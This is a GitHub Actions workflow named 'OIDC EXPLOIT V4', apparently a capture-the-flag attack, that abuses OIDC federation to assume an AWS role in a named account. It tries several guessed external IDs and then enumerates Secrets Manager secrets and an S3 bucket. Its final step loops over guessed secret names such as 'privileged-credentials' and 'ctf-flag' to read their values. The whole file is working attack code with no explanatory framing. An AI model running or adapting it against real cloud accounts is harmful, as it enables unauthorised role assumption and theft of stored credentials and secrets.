name: OIDC EXPLOIT V4 - Simplified

on:
  workflow_dispatch:
  push:

jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
    - name: Debug Environment
      run: |
        echo "=== Environment Debug ==="
        echo "Repository: $GITHUB_REPOSITORY"
        echo "Repository Owner: $GITHUB_REPOSITORY_OWNER"
        echo "Actor: $GITHUB_ACTOR"
        echo "Ref: $GITHUB_REF"
        echo "AWS CLI version:"
        aws --version
        
    - name: Try HEXNOVA404 External ID
      continue-on-error: true
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::170974506515:role/prod-readonly-auditor
        aws-region: us-west-1
        role-session-name: GitHubOIDC-HEXNOVA404
        role-external-id: "HEXNOVA404"
        
    - name: Check AWS Access - HEXNOVA404
      continue-on-error: true
      run: |
        if aws sts get-caller-identity 2>/dev/null; then
          echo "üéâ SUCCESS with HEXNOVA404!"
          aws secretsmanager list-secrets || echo "No secrets access"
          aws s3 ls s3://ci-deployment-logsv1/ || echo "No S3 access"
        fi
        
    - name: Try Date-based External ID (2025-07-10)
      continue-on-error: true
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::170974506515:role/prod-readonly-auditor
        aws-region: us-west-1
        role-session-name: GitHubOIDC-Date
        role-external-id: "2025-07-10"
        
    - name: Check AWS Access - Date
      continue-on-error: true
      run: |
        if aws sts get-caller-identity 2>/dev/null; then
          echo "üéâ SUCCESS with 2025-07-10!"
          aws secretsmanager list-secrets || echo "No secrets access"
          aws s3 ls s3://ci-deployment-logsv1/ || echo "No S3 access"
        fi
        
    - name: Try Repository External ID
      continue-on-error: true
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::170974506515:role/prod-readonly-auditor
        aws-region: us-west-1
        role-session-name: GitHubOIDC-Repo
        role-external-id: "Organisation-Vault"
        
    - name: Check AWS Access - Repository
      continue-on-error: true
      run: |
        if aws sts get-caller-identity 2>/dev/null; then
          echo "üéâ SUCCESS with Organisation-Vault!"
          aws secretsmanager list-secrets || echo "No secrets access"
          aws s3 ls s3://ci-deployment-logsv1/ || echo "No S3 access"
        fi
        
    - name: Try Account ID External ID
      continue-on-error: true
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::170974506515:role/prod-readonly-auditor
        aws-region: us-west-1
        role-session-name: GitHubOIDC-Account
        role-external-id: "170974506515"
        
    - name: Check AWS Access - Account
      continue-on-error: true
      run: |
        if aws sts get-caller-identity 2>/dev/null; then
          echo "üéâ SUCCESS with Account ID!"
          aws secretsmanager list-secrets || echo "No secrets access"
          aws s3 ls s3://ci-deployment-logsv1/ || echo "No S3 access"
        fi

    - name: Try No External ID (Trust Policy Issue)
      continue-on-error: true
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: arn:aws:iam::170974506515:role/prod-readonly-auditor
        aws-region: us-west-1
        role-session-name: GitHubOIDC-NoExtId
        
    - name: Check AWS Access - No External ID
      continue-on-error: true
      run: |
        if aws sts get-caller-identity 2>/dev/null; then
          echo "üéâ SUCCESS with no external ID!"
          aws secretsmanager list-secrets || echo "No secrets access"
          aws s3 ls s3://ci-deployment-logsv1/ || echo "No S3 access"
        fi

    - name: Final Summary
      run: |
        echo "=== FINAL CHECK ==="
        if aws sts get-caller-identity 2>/dev/null; then
          echo "‚úÖ We have AWS access!"
          echo "Caller Identity:"
          aws sts get-caller-identity
          
          echo "Listing Secrets Manager secrets:"
          aws secretsmanager list-secrets --region us-west-1
          
          echo "Trying common secret names:"
          for secret in "hexnova404-prod-secrets" "audit-access-key" "final-flag" "ctf-flag" "privileged-credentials"; do
            echo "Checking: $secret"
            aws secretsmanager get-secret-value --secret-id "$secret" --region us-west-1 2>/dev/null || echo "Not found: $secret"
          done
        else
          echo "‚ùå No AWS access achieved"
        fi